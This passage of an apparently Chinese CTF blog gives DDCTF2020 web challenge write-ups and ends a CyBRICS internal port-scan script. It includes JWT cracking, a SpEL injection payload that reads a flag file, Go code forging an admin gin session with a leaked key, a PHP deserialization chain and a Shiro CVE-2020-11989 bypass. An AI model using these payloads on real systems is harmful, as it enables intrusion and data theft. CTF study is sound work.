check(text);</span><br><span class="line">&#125;</span><br><span class="line">async function scan()&#123;</span><br><span class="line">	var to = from + 80 &gt; 65535 ? 65535 : from + 80;</span><br><span class="line">	for(var i=from;i&lt;to;i++)&#123;</span><br><span class="line">		make(String(i));</span><br><span class="line">	&#125;</span><br><span class="line">	from +=80;</span><br><span class="line">	setTimeout(()=&gt;&#123;clearstyle(from,to);&#125;,5000);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">async function listener ()&#123;</span><br><span class="line">	console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);</span><br><span class="line">	if(from &lt; 65535)&#123;</span><br><span class="line">		setTimeout(listener,5000);</span><br><span class="line">		if(complete &amp;&amp; !clear)&#123;</span><br><span class="line">			console.log(&quot;new task!&quot;);</span><br><span class="line">			scan()</span><br><span class="line">				.then(()=&gt;&#123;complete = true;&#125;)</span><br><span class="line">			complete = false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">listener()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p>
<p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/CyBRICS2020/" data-id="cku8j3fgb001edan73tyf7fty" data-title="CyBRICS2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DDCTF2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/DDCTF2020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/DDCTF2020/">DDCTF2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DDCTF2020"><a href="#DDCTF2020" class="headerlink" title="DDCTF2020"></a>DDCTF2020</h1><h2 id="拼图游戏"><a href="#拼图游戏" class="headerlink" title="拼图游戏"></a>拼图游戏</h2><p>纯手工</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200906061331.png" alt="image80"></p>
<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>根据题目提示得到两个接口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Method | POST</span><br><span class="line">URL    | http://117.51.136.197/admin/login</span><br><span class="line">Param  | username str | pwd str</span><br><span class="line">Response</span><br><span class="line">token str | auth(Certification information)</span><br><span class="line"></span><br><span class="line">- auth interface</span><br><span class="line">Request</span><br><span class="line">Method | POST</span><br><span class="line">URL    | http://117.51.136.197/admin/auth</span><br><span class="line">Param  | username str | pwd str | token str</span><br><span class="line">Response</span><br></pre></td></tr></table></figure>

<p>用c-jwt-cracker爆破login生成的jwt</p>
<p>得到下一步入口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client</span><br></pre></td></tr></table></figure>

<p>是一个go文件，叫二进制队友来逆</p>
<p>得到收发脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">t = time.time()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">t = <span class="built_in">str</span>(t)</span><br><span class="line"></span><br><span class="line">t = t[:<span class="number">10</span>]</span><br><span class="line">cmd=<span class="string">&quot;99-9&quot;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;|&quot;</span>.<span class="built_in">format</span>(cmd) + t</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">t = <span class="built_in">bytes</span>(s, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">message = t</span><br><span class="line">key = <span class="string">b&#x27;DDCTFWithYou&#x27;</span></span><br><span class="line">h = hmac.new(key,message,digestmod=<span class="string">&#x27;SHA256&#x27;</span>)</span><br><span class="line">signature=base64.b64encode(h.digest()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://117.51.136.197:80/server/command&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Go-http-client/1.1&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip&quot;</span>&#125;</span><br><span class="line">burp0_json=&#123;<span class="string">&quot;signature&quot;</span>:signature ,<span class="string">&quot;command&quot;</span>: cmd,  <span class="string">&quot;timestamp&quot;</span>: s[-<span class="number">10</span>:]&#125;</span><br><span class="line"><span class="built_in">print</span>(burp0_json)</span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>但是在这里我卡住了，因为client是用go写的我也理所当然的认为后端也是用</p>
<p>go写的，于是就去试go的各种eval框架都不行，最后还是在别人的提示下才走出误区（应该写一个测试SSTI，eval等等的fuzz字典），经过一天的折腾后发现是SPeL</p>
<p>去网上找到了Ying师傅的payload</p>
<p><code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;/home/dc2-user/flag/flag.txt&#39;)))).nextLine()</code></p>
<p><code>DDCTF&#123;Q24uf486whGOWN44UtZCjYUgdnnnRaVs&#125;</code></p>
<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>目标是让我们拿到100个卡片，但是有时间限制，利用借入和借出来获得100个卡片显然是不现实的。</p>
<p>刚开始想的是条件竞争，后来测试后发现不行，在这里我被卡住了。</p>
<p>继续测试发现，这里存在着整数溢出漏洞（卡片数是个大整数，而借入借出是个小整数），我们让卡片数不溢出，而借入数溢出，就可以得到许多卡片。接着我们得到了一个SecKey和获取flag的地址：<code>/flag</code>，但是需要我们是admin账号</p>
<p><code>session:MTU5OTIyNTI5MXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl5TlRJNU1Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXlOVEk1TVgwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfMaqAqFFw43-8z8EcAFY04oenUI0FyhjaW8KZXGH2uSX</code></p>
<p>对session进行解密发现,他的格式类似：<code>base64encode(timestamp|base64urlencode(gob)|check)</code></p>
<p>利用<a target="_blank" rel="noopener" href="https://gitlab.com/drosseau/degob">https://gitlab.com/drosseau/degob</a> 获得gob内容</p>
<p><code>map[interface&#123;&#125;]interface&#123;&#125;&#123;&quot;admin&quot;: false,&quot;wallet&quot;: &quot;&#123;&quot;owings&quot;:[&#123;&quot;OwingMoney&quot;:100000,&quot;NeedMoney&quot;:100002,&quot;OwingTime&quot;:1599223614&#125;],&quot;invests&quot;:[&#123;&quot;InvestMoney&quot;:100006,&quot;ReceiveMoney&quot;:100009,&quot;InvestTime&quot;:1599223644&#125;],&quot;money&quot;:0,&quot;now_time&quot;:1599222955,&quot;start_time&quot;:1599222835&#125;&quot;&#125;</code></p>
<p>显然我们需要修改admin的值，在云屿师傅的帮助下知道了这是一个gin生成的session</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        r := gin.Default()</span><br><span class="line">        store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">&quot;Udc13VD5adM_c10nPxFu@v12&quot;</span>))</span><br><span class="line">        r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/incr&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line">                <span class="keyword">var</span> count <span class="keyword">bool</span></span><br><span class="line">                v := session.Get(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> v == <span class="literal">nil</span> &#123;</span><br><span class="line">                        count = <span class="literal">true</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        count = v.(<span class="keyword">bool</span>)</span><br><span class="line">                        count = <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                session.Set(<span class="string">&quot;admin&quot;</span>, count)</span><br><span class="line">                session.Save()</span><br><span class="line">                c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;admin&quot;</span>: count&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag:<code>DDCTF&#123;Th151s3AsY4ormE2333!&#125;</code></p>
<h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><p>题目环境：PHP/5.6.10</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DDCTF <span class="number">2020</span>, Have fun!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$kw0ng</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">&#x27;find /HackersForever &#x27;</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HintClass</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t Do That!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowOff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;/hint/hint.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">&quot;POP me! I can give you some hints!&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiddleMan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cont</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> ShowOff();</span><br><span class="line"><span class="variable">$bullet</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bullet&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$bullet</span>))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Give Me Something!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$bullet</span> == <span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$infos</span> = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obstacle1</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$obstacle2</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$mc</span> = <span class="keyword">new</span> MyClass();</span><br><span class="line">    <span class="variable">$mc</span>-&gt;flag = <span class="string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;</span><br><span class="line">    @unserialize(<span class="variable">$bullet</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$mc</span>-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接访问hint.php</p>
<p>得到：<code>Good Job! You&#39;ve got the preffix of the flag: DDCTF&#123;VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</code></p>
<p>看样子是要让我们利用GMP打他</p>
<p>这里不急先分析一下代码，构思一下可以利用的反序列化链</p>
<p><code>ShowOff::__wakeup-&gt;MiddleMan::__unset-&gt;$func();</code> </p>
<p>令<code>$func=[MyClass,&quot;get_flag&quot;]</code>实现任意命令执行，结束（GMP就不见了，盲猜出题人没限制好）</p>
<h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h2><p>第一次熬夜杠题，真爽</p>
<p>登陆失败后响应体出现：<code>RememberMe=DeleteMe</code>，shiro稳了</p>
<p>尝试一下Shiro 反序列化，果然GG</p>
<p><a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">https://shiro.apache.org/security-reports.html</a></p>
<p>去官网看下CVE，试一下发现存在CVE-2020-11989</p>
<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index</a></p>
<p>绕过权限验证，发现任意文件读取接口</p>
<p><code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg</code></p>
<p>（原本是想直接读取Shiro的key来直接打穿的，搞了好久都没找到）</p>
<p>常规思路：</p>
<ol>
<li><p>先读取 web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span> <span class="attr">metadata-complete</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-core.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.WebAppRootListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.IntrospectorCleanupListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-web.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      